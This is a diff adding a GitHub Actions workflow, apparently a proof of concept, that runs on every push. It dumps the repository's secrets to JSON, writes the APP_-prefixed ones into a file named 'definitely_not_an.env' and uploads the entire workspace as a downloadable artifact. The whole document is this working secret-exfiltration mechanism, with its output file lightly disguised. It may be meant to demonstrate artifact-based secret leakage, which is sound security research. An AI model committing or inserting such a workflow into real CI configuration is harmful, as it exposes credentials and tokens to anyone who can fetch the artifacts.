@@ -1,0 +1,22 @@
+name: poc.yml
+on:
+  push:
+    branches:
+      - '**'
+
+jobs:
+  poc:
+    environment: poc
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create .env
+        env:
+          SECRETS: ${{ toJson(secrets) }}
+        run: |
+          echo "$SECRETS" | jq -r 'to_entries[] | select( .key | test("^APP_") ) | ( .key | sub("^APP_"; "") ) + "=" + ( .value )' >> definitely_not_an.env
+      - name: Upload art
+        uses: actions/upload-artifact@v4
+        with:
+          name: poc
+          path: |
+            ./
